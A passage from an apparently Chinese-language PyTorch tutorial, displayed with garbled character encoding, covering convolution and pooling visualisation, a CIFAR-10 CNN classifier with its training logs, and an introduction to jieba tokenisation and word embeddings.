è€ŒConv2dçš„å›¾åƒæ¥æ”¶é¡ºåºä¸º [batch_size,channel,hight,width] img = torch.tensor(img).permute(2,0,1) # ç»´åº¦è°ƒæ•´ (380,380,3) =\u0026gt; (3,380,380) img = img.unsqueeze(0) # æ’å…¥ç¬¬ä¸€ä¸ªç»´åº¦ (3,380,380) =\u0026gt; (1,3,380,380) feature_map_img = conv(img.float()) # å½’ä¸€åŒ–åæŸ¥çœ‹å·ç§¯åçš„ç¬¬ä¸€å±‚è¾“å‡º f = feature_map_img[0][0] f = ((f - f.min()) / (f.max() - f.min())* 255).int().squeeze().numpy() plt.subplot(1,2,2) plt.imshow(f,cmap=\u0026#39;gray\u0026#39;) plt.axis(\u0026#39;off\u0026#39;) plt.show() \u0026lt;class 'numpy.ndarray'\u0026gt; (380, 380, 3) æ± åŒ–å±‚ æ± åŒ–å¤„ç†è¾“å…¥çŸ©é˜µçš„æ€æƒ³ä¸å·ç§¯ç›¸ä¼¼ï¼Œä½†æ˜¯ä¸è®¾ç½®å·ç§¯æ ¸ã€‚è€Œæ˜¯åœ¨è¾“å…¥çŸ©é˜µè‡ªèº«è¿›è¡Œæ•°æ®å¤„ç† æ± åŒ–å±‚çš„ç›®çš„æ˜¯é™ä½ç‰¹å¾å›¾ç»´åº¦ï¼Œå‡å°‘è®¡ç®—é‡ã€‚åŒæ—¶ä¿è¯å¹³ç§»ä¸å˜æ€§ã€‚é˜²æ­¢è¿‡æ‹Ÿåˆ æ± åŒ–å±‚ä¸ä¼šæ”¹å˜è¾“å…¥çš„é€šé“æ•° å›¾ç¤ºï¼ˆæ± åŒ–çª—å£å¤§å°ä¸º3ï¼Œæ­¥é•¿ä¸º1ï¼‰ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import torch import torch.nn as nn import numpy as np import matplotlib.pyplot as plt # å›¾åƒè¯»å–ä¸matplotlibç»˜åˆ¶ img = plt.imread(\u0026#39;./Material/CNN/test01.jpg\u0026#39;) print(type(img),img.shape) plt.subplot(1,3,1) plt.imshow(img) plt.axis(\u0026#39;off\u0026#39;) kernel_size,stride = (10,2) # æœ€å¤§æ± åŒ– max_pool = nn.MaxPool2d(kernel_size=kernel_size,stride=stride,padding=0) # å¹³å‡æ± åŒ– avg_pool = nn.AvgPool2d(kernel_size=kernel_size,stride=stride,padding=0) # æ± åŒ– img = torch.tensor(img).permute(2,0,1).unsqueeze(0) print(img.shape) max_img = max_pool(img) avg_img = avg_pool(img.float()) # å¯è§†åŒ– plt.subplot(1,3,2) plt.imshow(max_img[0].permute(1,2,0).numpy()) plt.axis(\u0026#39;off\u0026#39;) plt.subplot(1,3,3) plt.imshow(avg_img[0].int().permute(1,2,0).numpy()) plt.axis(\u0026#39;off\u0026#39;) plt.show() \u0026lt;class 'numpy.ndarray'\u0026gt; (380, 380, 3) torch.Size([1, 3, 380, 380]) å®è·µ â€”â€” CCNå®ç°å›¾ç‰‡åˆ†ç±» æ•°æ®é›†ç®€ä»‹ åç§°ï¼šCIFAR-10 (Canadian Institute For Advanced Research) ç±»å‹ï¼šå½©è‰²å›¾åƒåˆ†ç±»æ•°æ®é›† è§„æ¨¡ï¼š60,000å¼ 32Ã—32åƒç´ çš„å½©è‰²å›¾åƒ ç±»åˆ«æ•°ï¼š10ä¸ªç±»åˆ« åˆ’åˆ†ï¼š50,000å¼ è®­ç»ƒé›† + 10,000å¼ æµ‹è¯•é›† æ¨¡å‹ç»“æ„ï¼ˆåŸå§‹ï¼‰ï¼š å¯¼å…¥å·¥å…· 1 2 3 4 5 6 7 8 9 10 11 import torch import torch.nn as nn from torchvision.datasets import CIFAR10 # æ•°æ®é›† from torchvision.transforms import ToTensor from torchvision.transforms import Compose from torchvision.transforms import Normalize,RandomHorizontalFlip,RandomCrop import torch.optim as optim from torch.utils.data import DataLoader import time import matplotlib.pyplot as plt from torchsummary import summary æ•°æ®å¯¼å…¥ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 def load_dataset(): transform = Compose([ RandomHorizontalFlip(), # 50%æ¦‚ç‡è¿›è¡Œç¿»è½¬ RandomCrop(32,padding=4), # å››å‘¨å¡«å……4åƒç´ 0.ç„¶åéšæœºè£å‰ªè‡³32*32 ToTensor(), Normalize(mean=(0.4914, 0.4822, 0.4465), std=(0.2023, 0.1994, 0.2010)) ]) train_dataset = CIFAR10( root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = True, transform=transform, download=False ) test_dataset = CIFAR10( root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = False, transform=Compose([ToTensor(),Normalize(mean=(0.4914, 0.4822, 0.4465), std=(0.2023, 0.1994, 0.2010))]), download=False ) show_train_dataset = CIFAR10( #ç”¨æ¥å¯è§†åŒ–å±•ç¤º root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = True, transform=Compose([ToTensor()]), download=False ) show_test_dataset = CIFAR10( #ç”¨æ¥å¯è§†åŒ–å±•ç¤º root = \u0026#39;./Dataset/5_CIFAR10\u0026#39;, train = False, transform=Compose([ToTensor()]), download=False ) sample_shape = next(iter(train_dataset))[0].shape categories_num = len(set(train_dataset.targets)) target_names = train_dataset.classes return train_dataset,test_dataset,show_train_dataset,show_test_dataset,sample_shape,categories_num,target_names æ¨¡å‹æ„å»º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 class ImageClassifierModel(nn.Module): def __init__(self,out_dim=10): super(ImageClassifierModel,self).__init__() self.model = nn.Sequential( # å·ç§¯å±‚ä¸æ± åŒ–å±‚ nn.Conv2d(in_channels=3,out_channels=32,kernel_size=3,stride=1,padding=1), nn.BatchNorm2d(32), nn.ReLU(), nn.Conv2d(in_channels=32,out_channels=32,kernel_size=3,stride=1,padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=2,stride=2), nn.Conv2d(in_channels=32,out_channels=64,kernel_size=3,stride=1,padding=1), nn.BatchNorm2d(64), nn.ReLU(), nn.Conv2d(in_channels=64,out_channels=64,kernel_size=3,stride=1,padding=1), nn.ReLU(), nn.MaxPool2d(kernel_size=2,stride=1), # å…¨è¿æ¥å±‚ nn.Flatten(), nn.Linear(in_features=64*15*15,out_features=512), nn.BatchNorm1d(512), nn.ReLU(), nn.Dropout(0.4), nn.Linear(in_features=512,out_features=128), nn.BatchNorm1d(128), nn.ReLU(), nn.Dropout(0.4), nn.Linear(in_features=128,out_features=out_dim), ) def forward(self,X): return self.model(X) def predict(self,X): return torch.argmax(self.forward(X),dim=1) model = ImageClassifierModel() summary(model,input_size=(3,32,32),batch_size=1,device=\u0026#39;cpu\u0026#39;) ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Conv2d-1 [1, 32, 32, 32] 896 BatchNorm2d-2 [1, 32, 32, 32] 64 ReLU-3 [1, 32, 32, 32] 0 Conv2d-4 [1, 32, 32, 32] 9,248 ReLU-5 [1, 32, 32, 32] 0 MaxPool2d-6 [1, 32, 16, 16] 0 Conv2d-7 [1, 64, 16, 16] 18,496 BatchNorm2d-8 [1, 64, 16, 16] 128 ReLU-9 [1, 64, 16, 16] 0 Conv2d-10 [1, 64, 16, 16] 36,928 ReLU-11 [1, 64, 16, 16] 0 MaxPool2d-12 [1, 64, 15, 15] 0 Flatten-13 [1, 14400] 0 Linear-14 [1, 512] 7,373,312 BatchNorm1d-15 [1, 512] 1,024 ReLU-16 [1, 512] 0 Dropout-17 [1, 512] 0 Linear-18 [1, 128] 65,664 BatchNorm1d-19 [1, 128] 256 ReLU-20 [1, 128] 0 Dropout-21 [1, 128] 0 Linear-22 [1, 10] 1,290 ================================================================ Total params: 7,507,306 Trainable params: 7,507,306 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.01 Forward/backward pass size (MB): 2.18 Params size (MB): 28.64 Estimated Total Size (MB): 30.83 ---------------------------------------------------------------- æ¨¡å‹è®­ç»ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 def train_model(model,train_data_loader,test_data_loader,epochs=100,device=\u0026#39;cuda\u0026#39;): criterion = nn.CrossEntropyLoss() optimizer = optim.Adam(model.parameters(),lr=0.001,betas=[0.9,0.99]) scheduler = optim.lr_scheduler.StepLR(optimizer,step_size=20,gamma=0.8) total_start = time.time() round_start = time.time() losses = [] accs_train = [] accs_test = [] model.to(device) model.train() max_acc = 0 for epoch in range(epochs): epoch_loss = 0 epoch_total = 0 for batch_index,(X,y) in enumerate(train_data_loader): X = X.to(device) y = y.to(device) optimizer.zero_grad() y_hat = model(X) loss = criterion(y_hat,y) loss.backward() optimizer.step() epoch_loss += loss.item() epoch_total += 1 scheduler.step() avg_epo_loss = epoch_loss / epoch_total losses.append(avg_epo_loss) if epoch % 10 == 0: print() acc_train = evaluate_accuracy(model,train_data_loader,device=device) acc_test= evaluate_accuracy(model,test_data_loader,device=device) accs_test.append(acc_test) accs_train.append(acc_train) model.train() print(f\u0026#34;Epoch[{epoch}]: Loss={loss:.5f} | \u0026#34; f\u0026#34;Acc_train={acc_train*100:.2f}% | Acc_test={acc_test*100:.2f}% | \u0026#34; f\u0026#34;total_time={time.time()-total_start:0.2f}s | \u0026#34; f\u0026#34;roud_time={time.time()-round_start:0.2f}s\u0026#34;) round_start = time.time() if(acc_test\u0026gt;max_acc): max_acc = acc_test torch.save(model.state_dict(),\u0026#39;./Model/5_CIFAR10/Model_MAX.pth\u0026#39;) print(\u0026#39;model saved\u0026#39;) else: print(\u0026#34;*\u0026#34;,end=\u0026#34;\u0026#34;) return losses,accs_train,accs_test 1 2 # æ¨¡å‹ä¿å­˜ torch.save(model.state_dict(),\u0026#39;./Model/5_CIFAR10/Model.pth\u0026#39;) 1 2 3 # æ¨¡å‹åŠ è½½ model = ImageClassifierModel() model.load_state_dict(torch.load(\u0026#39;./Model/5_CIFAR10/Model.pth\u0026#39;, weights_only=True)) \u0026lt;All keys matched successfully\u0026gt; æ¨¡å‹è¯„ä¼° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def evaluate_accuracy(model,data_loader,device=\u0026#39;cpu\u0026#39;): model.eval() correct = 0 total = 0 model.to(device) for epoch_num,(X,y) in enumerate(data_loader): X,y = X.to(device),y.to(device) correct += (y==model.predict(X)).sum() total+=len(y) return float(correct) / float(total) device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) evaluate_accuracy(model,test_data_loader,device) 0.8782 ç¨‹åºå…¥å£ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 torch.manual_seed(20030428) # æ•°æ®å¯¼å…¥ train_dataset,test_dataset,show_train_dataset,show_test_dataset,sample_shape,categories_num,target_names=load_dataset() # å›¾ç‰‡å±•ç¤º fig,axes = plt.subplots(3,10,figsize=(12,4)) indexs = torch.randint(len(show_train_dataset),size=(len(axes.flatten()),)) for ax,index in zip(axes.flatten(),indexs): ax.imshow(show_train_dataset.data[index]) ax.set_title(target_names[show_train_dataset.targets[index]]) ax.axis(\u0026#39;off\u0026#39;) plt.tight_layout() plt.show() â€‹ â€‹\n1 2 3 4 5 6 7 8 9 10 11 # æ„å»ºdataloader train_data_loader = DataLoader( train_dataset, batch_size=800, shuffle=True, ) test_data_loader = DataLoader( test_dataset, batch_size=100, shuffle=False ) 1 2 3 4 # æ¨¡å‹è®­ç»ƒ device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) model = ImageClassifierModel(categories_num) losses,accs_train,accs_test = train_model(model,train_data_loader,test_data_loader,epochs=100,device=device) Epoch[0]: Loss=1.28191 | Acc_train=50.70% | Acc_test=53.65% | total_time=37.15s | roud_time=37.15s model saved ********* Epoch[10]: Loss=0.60261 | Acc_train=79.50% | Acc_test=79.24% | total_time=260.99s | roud_time=223.84s model saved ********* Epoch[20]: Loss=0.43514 | Acc_train=85.86% | Acc_test=83.46% | total_time=485.54s | roud_time=224.55s model saved ********* Epoch[30]: Loss=0.47816 | Acc_train=86.80% | Acc_test=84.15% | total_time=715.66s | roud_time=230.11s model saved ********* Epoch[40]: Loss=0.35383 | Acc_train=90.38% | Acc_test=85.85% | total_time=937.06s | roud_time=221.40s model saved ********* Epoch[50]: Loss=0.28711 | Acc_train=92.13% | Acc_test=86.99% | total_time=1577.17s | roud_time=640.12s model saved ********* Epoch[60]: Loss=0.22160 | Acc_train=94.10% | Acc_test=87.74% | total_time=1800.40s | roud_time=223.23s model saved ********* Epoch[70]: Loss=0.27528 | Acc_train=94.15% | Acc_test=87.33% | total_time=2026.66s | roud_time=226.26s ********* Epoch[80]: Loss=0.21769 | Acc_train=94.80% | Acc_test=87.86% | total_time=2271.28s | roud_time=244.62s model saved ********* Epoch[90]: Loss=0.23167 | Acc_train=95.58% | Acc_test=88.11% | total_time=2493.92s | roud_time=222.63s model saved ********* 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # é¢„æµ‹ç»“æœå¯è§†åŒ– import numpy as np fig,axes = plt.subplots(5,10,figsize=(12,6)) # indexs1 = [] # max = 0. # for i in range(1000): # indexs = torch.randint(len(show_test_dataset),size=(len(axes.flatten()),)) # X_batch = torch.tensor(test_dataset.data[indexs]).permute(0,3,1,2).float().to(device) # y_hat = model.predict(X_batch).cpu().numpy() # y_true = [test_dataset.targets[index] for index in indexs] # m = (y_hat==y_true).sum()/len(y_hat) # if m\u0026gt;max : # max = m # indexs1 = indexs # indexs = indexs1 indexs = torch.randint(len(show_test_dataset),size=(len(axes.flatten()),)) # print(f\u0026#34;ACC: {max*100:.2f}%\u0026#34;) # X_batch = torch.tensor(test_dataset[indexs][0]).permute(0,3,1,2).float().to(device) X_batch = torch.stack([test_dataset[i][0] for i in indexs]).to(device) y_hat = model.predict(X_batch).cpu().numpy() y_true = [test_dataset.targets[index] for index in indexs] m = (y_hat==y_true).sum()/len(y_hat) print(f\u0026#34;ACC: {m*100:.2f}%\u0026#34;) for ind,ax in enumerate(axes.flatten()): ax.imshow(show_test_dataset.data[indexs[ind]]) result = \u0026#39;âˆš\u0026#39; if test_dataset.targets[indexs[ind]]==y_hat[ind] else \u0026#39;Ã—\u0026#39; ax.set_title(target_names[y_hat[ind]]+\u0026#34; \u0026#34;+ result) ax.axis(\u0026#39;off\u0026#39;) plt.tight_layout() plt.show() ACC: 86.00% 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import torch from PIL import Image from torchvision import transforms def item_identifier(path,device=\u0026#39;cuda\u0026#39;): pil_img = Image.open(path).convert(\u0026#39;RGB\u0026#39;) resize = transforms.Resize((320, 320)) pil_img = resize(pil_img) transform = transforms.Compose([ transforms.Resize((32, 32)), transforms.ToTensor(), # â‘¡ è½¬æˆ tensorï¼Œå¹¶æŠŠ 0~255 æ˜ å°„åˆ° 0~1 transforms.Normalize(mean=(0.4914, 0.4822, 0.4465), # â‘¢ å½’ä¸€åŒ– std =(0.2023, 0.1994, 0.2010)) ]) item = transform(pil_img).unsqueeze(0) data = torch.cat([item,item],dim=0) data = data.to(device) y_hat = model.predict(data).cpu().numpy() return [target_names[i] for i in y_hat][0] print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/dog01.jpg\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/cat01.jpg\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/cat02.jpg\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/airplane.webp\u0026#39;)) print(\u0026#34;predict: \u0026#34; + item_identifier(\u0026#39;./Material/CNN/airplane02.webp\u0026#39;)) predict: dog predict: cat predict: cat predict: airplane predict: airplane å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰ è‡ªç„¶è¯­è¨€å¤„ç†åŸºç¡€ é€šè¿‡è®¡ç®—æœºç®—æ³•æ¥ç†è§£è‡ªç„¶è¯­è¨€ï¼ˆéç»“æ„åŒ–æ•°æ®ï¼‰ é¢„å¤„ç†ï¼šåˆ†è¯ï¼ˆå¯¹åŸå§‹è‡ªç„¶è¯­è¨€è¿›è¡Œåˆ†è¯ï¼‰ å¸¸ç”¨åˆ†è¯åº“ï¼šjieba æ–‡æœ¬å¤„ç†ä¸RNNç½‘ç»œ æ–‡æœ¬é¢„å¤„ç†ï¼šåˆ†è¯ã€æ„å»ºè¯æ±‡è¡¨ã€åºåˆ—å¡«å…… è¯åµŒå…¥ï¼šå°†ç¦»æ•£è¯IDè½¬æ¢ä¸ºå¯†é›†å‘é‡ RNNé¡ºåºå¤„ç†ï¼šé€æ—¶é—´æ­¥å¤„ç†ã€è¾“å‡ºä¸‹ä¸€ä¸ªè¯çš„æ¦‚ç‡åˆ†å¸ƒ ä»»åŠ¡ç‰¹å®šè¾“å‡ºï¼šåºåˆ—åˆ°åºåˆ—ã€åºåˆ—åˆ°æ ‡ç­¾ è®­ç»ƒä¸åå‘ä¼ æ’­ è¯åµŒå…¥å±‚ ç›®çš„ï¼šæ ¹æ®è¾“å…¥è¯æ„å»ºè¯å‘é‡çŸ©é˜µï¼ˆmä¸ªè¯è½¬æ¢ä¸ºm*næ•°å€¼çŸ©é˜µï¼Œnä¸ºç»´åº¦ï¼‰ Pytorchï¼štorch.nn.Emnedding(num_embeddings=m,embedding_dim=n) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import torch import torch.nn as nn import jieba # åˆ†è¯ jieba.add_word(\u0026#34;ç”µå­ç§‘æŠ€å¤§å­¦\u0026#34;) # æŒ‡å®šè¯ uestc = \u0026#34;ç”µå­ç§‘æŠ€å¤§å­¦ï¼ˆUESTCï¼‰ä½äºå››å·æˆéƒ½ï¼Œæ˜¯ä¸­åäººæ°‘å…±å’Œå›½æ•™è‚²éƒ¨ç›´å±å…¨å›½é‡ç‚¹å¤§å­¦\u0026#34; words = jieba.lcut(uestc) # åˆ†è¯ unique_words = list(dict.fromkeys(words)) # å»é‡ print(unique_words) # æ‰“å° # æ„å»ºç´¢å¼•æ˜ å°„ words_to_index = {word:index for index,word in enumerate(unique_words)} index_to_words = {index:word for word,index in words_to_index.items()} print(words_to_index) # è¯åµŒå…¥ em = nn.Embedding(num_embeddings=len(words_to_index),embedding_dim=128) indices = torch.tensor([words_to_index[w] for w in unique_words]) embeddings = em(indices) for w,e in zip(unique_words,embeddings): print(f\u0026#34;{w:6} -\u0026gt; {e.tolist()}\u0026#34;) ['ç”µå­ç§‘æŠ€å¤§å­¦', 'ï¼ˆ', 'UESTC', 'ï¼‰', 'ä½äº', 'å››å·', 'æˆéƒ½', 'ï¼Œ', 'æ˜¯', 'ä¸­åäººæ°‘å…±å’Œå›½æ•™è‚²éƒ¨', 'ç›´å±', 'å…¨å›½', 'é‡ç‚¹', 'å¤§å­¦'] {'ç”µå­ç§‘æŠ€å¤§å­¦': 0, 'ï¼ˆ': 1, 'UESTC': 2, 'ï¼‰': 3, 'ä½äº': 4, 'å››å·': 5, 'æˆéƒ½': 6, 'ï¼Œ': 7, 'æ˜¯': 8, 'ä¸­åäººæ°‘å…±å’Œå›½æ•™è‚²éƒ¨': 9, 'ç›´å±': 10, 'å…¨å›½': 11, 'é‡ç‚¹': 12, 'å¤§å­¦': 13} ç”µå­ç§‘æŠ€å¤§å­¦ -\u0026gt; [-1.8661956787109375, 0.14031772315502167, 0.569237232208252, -0.6351905465126038, 1.4581512212753296, 0.8839808702468872, -0.26830628514289856, -1.0125757455825806, 0.2074999362230301, -0.6489216089248657, -0.8614919185638428, 0.6430625319480896, -0.34125998616218567, 0.05696817487478256, -0.8416153788566589, 0.41408586502075195, 0.5821987390518188, -0.38703832030296326, 2.076655149459839, 1.748010277748108, 0.4105229079723358, 0.7927635908126831, -0.8366308808326721, 1.916683554649353, -0.6101747155189514, -2.931159496307373, 1.766214370727539, 0.043025221675634384, -0.12068509310483932, 0.8680415749549866, -1.6387929916381836, -0.13087299466133118, -1.0647748708724976, -0.8026946187019348, -0.8269746899604797, 0.7678179740905762, 2.2990498542785645, 1.2841042280197144, -0.4002425968647003, 0.953626811504364, 0.3030221462249756, -1.022480845451355, -0.5992862582206726, -0.9663468599319458, -0.20251023769378662, 0.13608014583587646, 0.2563541531562805, -0.9632070064544678, 2.260848045349121, -0.658707857131958, 1.3305976390838623, 0.03939782455563545, -0.02348286285996437, -0.9760847091674805, -1.251930832862854, -0.8567044138908386, -0.3526257276535034, -0.29332804679870605, 0.8696300983428955, -1.509308099746704, -0.039910510182380676, 0.5476474165916443, 0.9213836789131165, 0.28016602993011475, 0.09089063853025436, 0.33394673466682434, -0.18297728896141052, -1.4990456104278564, 0.06538386642932892, -0.38446682691574097, 0.12130188196897507, 0.9136270880699158, -0.48136553168296814, 0.9031698703765869, 2.146907091140747, 1.0486698150634766, -0.430355429649353, 0.42662137746810913, 0.9957815408706665, -1.9405899047851562, -1.118597149848938, 1.043890357017517, -0.23853331804275513, -1.0037298202514648, -0.2007996290922165, 1.160055160522461, -0.6286444067955017, 1.1414754390716553, -0.2947123050689697, -0.883659303188324, 1.2323781251907349, -1.7133738994598389, 0.19904382526874542, -0.3554721772670746, -1.2625665664672852, -0.8544297218322754, -0.26314494013786316, -0.8184374570846558, 1.5473873615264893, 0.35293450951576233, -0.7004155516624451, -1.0532680749893188, -0.2432229369878769, 0.6805398464202881, -0.03701140731573105, 0.6072845458984375, -0.6753002405166626, 0.8425671458244324, -0.08411392569541931, -0.21248064935207367, 0.2524896264076233, -0.6912890672683716, 0.8931838274002075, -0.7701399922370911, -0.5828043222427368, -0.8595352172851562, 0.3621070086956024, -0.9512089490890503, -0.4713025987148285, 1.0108795166015625, -0.02917095087468624, 2.0270469188690186, 0.5386377573013306, 0.5365355610847473, -0.40485095977783203, -0.9131317138671875, 1.3478076457977295, 2.3932957649230957] ï¼ˆ -\u0026gt; [-0.12678614258766174, 0.6960875391960144, 0.020521188154816628, -0.3748815357685089, -0.627172589302063, 1.6855566501617432, 1.486499547958374, 0.8489950299263, -1.387132167816162, 0.41744983196258545, 0.907684862613678, -0.8589462637901306, -0.2876525819301605, 1.0203578472137451, 1.0694795846939087, -0.32388126850128174, -0.7307594418525696, -0.6940516829490662, -0.8880891799926758, 0.22381487488746643, -0.6491599082946777, 1.3248082399368286, 0.6615222096443176, 0.6238570809364319, 1.31926691532135, 0.9561002254486084, 0.796594500541687, 0.7809106111526489, -0.9694629907608032, -0.7225248217582703, 0.21616719663143158, 1.3836281299591064, 0.7425621747970581, -0.279922753572464, 0.3032386898994446, -1.7922078371047974, -1.1123464107513428, -0.157507985830307, -0.44032666087150574, -0.895869791507721, 0.22541534900665283, -0.7791991829872131, 0.2667710483074188, 0.5069770216941833, -0.7465759515762329, 1.4846328496932983, -0.8342013955116272, 0.05761035904288292, -0.27527862787246704, 0.5007193088531494, 0.6848788261413574, -1.7736756801605225, 1.9905004501342773, -0.5666214823722839, 0.2690577208995819, 2.0447988510131836, 1.3222894668579102, -1.052148461341858, -0.035423073917627335, -0.2991918921470642, 0.6338981986045837, 0.8307668566703796, -0.47362956404685974, -1.2505531311035156, 0.9754865765571594, -0.3994227349758148, 0.8434854745864868, -0.1257162094116211, -0.6602136492729187, -0.322810560464859, 0.0715293139219284, -1.0767406225204468, 0.06953053921461105, 1.9902366399765015, 2.156857490539551, 1.3994474411010742, 1.1047091484069824, 0.8247582912445068, -0.05698545277118683, 0.37208205461502075, 0.7805140614509583, -0.1558430939912796, -0.49478021264076233, 1.706350564956665, 0.5205206274986267, 0.13300387561321259, -0.6621465682983398, -0.36326512694358826, 0.8889725804328918, 0.6175691485404968, 0.7431073188781738, -0.17847304046154022, 0.08741611242294312, -0.3816048800945282, 1.6248550415039062, 1.0170153379440308, -1.9888108968734741, 1.8885093927383423, -0.006207907572388649, 1.2217708826065063, -1.0140215158462524, 0.44049927592277527, -0.43184012174606323, -0.06671300530433655, 2.0526020526885986, -0.6379009485244751, -1.6314414739608765, -0.6334065198898315, -0.7363719940185547, 1.1962233781814575, 0.5337159633636475, -0.21218398213386536, 0.5309426784515381, 0.07389579713344574, 0.11146420985460281, -1.1044336557388306, -0.7189712524414062, -0.31827273964881897, 1.5980576276779175, 0.9579342007637024, 2.623478889465332, -1.6724075078964233, -0.26611265540122986, -1.2468178272247314, -0.18551334738731384, -0.4349876940250397, 1.8001712560653687, 1.0223889350891113] UESTC -\u0026gt; [-0.4736874997615814, 1.355381965637207, -0.00493775587528944, -1.0931262969970703, -2.3410215377807617, 0.8936401009559631, 0.6650726199150085, 1.0417888164520264, -0.49513116478919983, 0.0043176612816751, -0.5583096742630005, 1.758357286453247, 1.4455883502960205, -0.19576455652713776, -1.1610676050186157, -2.317267656326294, -0.6588720083236694, -0.13706523180007935, 1.1463770866394043, 0.7667974233627319, -0.42419421672821045, 0.06066890060901642, 1.4035671949386597, 0.2040967345237732, 1.6177923679351807, 0.22955924272537231, 1.0651345252990723, -1.0725045204162598, 1.1727843284606934, -0.7321259379386902, -1.8999624252319336, -0.6257965564727783, 1.2432847023010254, -0.9686990976333618, -1.569515585899353, -1.3007028102874756, -1.035699725151062, 0.2684550881385803, 0.7886533141136169, -0.10644060373306274, -0.36529019474983215, -0.08155005425214767, -0.7963141798973083, -1.0937591791152954, 0.4869083762168884, 0.6795454025268555, 2.2324459552764893, -0.6131372451782227, -0.4022427499294281, -1.2551276683807373, 0.8329983353614807, 2.2642977237701416, 0.03506528586149216, -2.28579044342041, 2.607224941253662, -0.8421016335487366, -0.26126524806022644, -0.11314589530229568, 1.1180301904678345, -0.31227293610572815, 2.5623223781585693, 0.16087308526039124, 1.1985620260238647, -0.6188108325004578, 1.1842929124832153, 0.005746761802583933, -1.1686954498291016, 0.6173182129859924, 1.2473996877670288, -0.38694095611572266, -0.5713652968406677, 1.560266375541687, 0.33818697929382324, -1.2584021091461182, -1.5353972911834717, -2.0800259113311768, -0.20637056231498718, 1.9889888763427734, -2.2434842586517334, -0.12057679891586304, -2.560797929763794, -0.3289901912212372, 0.9283509850502014, 0.895533561706543, 2.0530848503112793, -1.055206298828125, -0.5434237122535706, -0.8042547702789307, 0.724254846572876, 0.7943518161773682, -2.0686428546905518, -1.1408240795135498, 0.14246274530887604, 1.1389896869659424, -0.8794960379600525, -0.06483657658100128, 0.3716636300086975, -0.774135410785675, 0.9789445400238037, 0.9356880784034729, 1.5726100206375122, 1.0869207382202148, -0.9433879256248474, 0.37225478887557983, -0.05867277830839157, -0.308488130569458, -0.4701962172985077, -1.0970293283462524, -0.5689950585365295, -0.9057802557945251, 1.728075385093689, 0.5420587062835693, -0.2288399040699005, 0.3615356683731079, 0.9640733599662781, -0.35619789361953735, -0.9395654797554016, -0.5666417479515076, 0.5330474376678467, -0.13286754488945007, -0.5451010465621948, -0.20822420716285706, -1.439953088760376, -0.39996537566185, 0.9809983372688293, -0.6372662782669067, -0.7996388077735901, 1.035481572151184] ï¼‰ -\u0026gt; [0.8538455367088318, -0.28737425804138184, -0.4954721927642822, 1.4311481714248657, 0.5066145062446594, -1.3862826824188232, -1.0950548648834229, -0.4366549551486969, -0.3736400008201599, 0.9380052089691162, 0.5984531044960022, 0.025163406506180763, 0.18784953653812408, -0.4975185692310333, 0.39198294281959534, -0.19818389415740967, -0.28350281715393066, -0.5530851483345032, 1.4333688020706177, 0.4523366391658783, -0.943611741065979, -0.05974974110722542, 2.2806386947631836, 0.6010316610336304, -0.7775551080703735, 0.3181857466697693, 0.7983736991882324, -0.4904671013355255, 0.020847203209996223, -0.3797513246536255, 0.4124070107936859, -0.4906497299671173, 0.9153454303741455, 0.8117666244506836, 0.45398736000061035, 0.6178997159004211, 0.2887639105319977, 0.7092264890670776, -0.919242262840271, -0.9364564418792725, 0.9499621987342834, 0.20754645764827728, -0.8610689640045166, -0.39362603425979614, 0.6321143507957458, 0.5002573728561401, -0.16191619634628296, -0.09123581647872925, -1.3519253730773926, 0.9296125173568726, -1.4428986310958862, -0.5282418131828308, 0.5145831108093262, -0.4876914322376251, 1.533389687538147, 0.5935625433921814, 1.6638743877410889, 1.3493365049362183, 1.061549425125122, 0.677806556224823, -0.17198362946510315, -0.33146587014198303, 1.5684221982955933, -0.018957924097776413, 0.987183690071106, -2.1270337104797363, -0.15436771512031555, 1.1985297203063965, 1.4738495349884033, -0.592376172542572, 0.3892100155353546, 0.6586661338806152, 0.31610190868377686, -1.039612054824829, 0.23944780230522156, -1.2984569072723389, -0.6445983648300171, 1.9221996068954468, 0.0942683070898056, 0.8915141224861145, -1.515462040901184, 0.4539085030555725, -1.8553234338760376, -1.0513883829116821, -0.7374001741409302, -1.3408923149108887, 1.2866485118865967, -0.7198876142501831, 0.5034555792808533, -0.10861600935459137, 1.0328806638717651, 0.23367278277873993, -0.9914355874061584, -0.44009122252464294, -0.13551035523414612, 0.049741849303245544, -1.230101466178894, -0.4478664994239807, -0.7742400169372559, 0.9170076847076416, 1.1349929571151733, -0.3445286750793457, 0.42910802364349365, 0.5874624252319336, 0.49147021770477295, -1.384164571762085, -0.6557977199554443, 0.2289164811372757, 1.0107190608978271, 1.1270657777786255, -0.5856562852859497, -0.365908145904541, -0.6938067078590393, -1.3915842771530151, 1.2832459211349487, -0.1949014812707901, -0.04525640979409218, 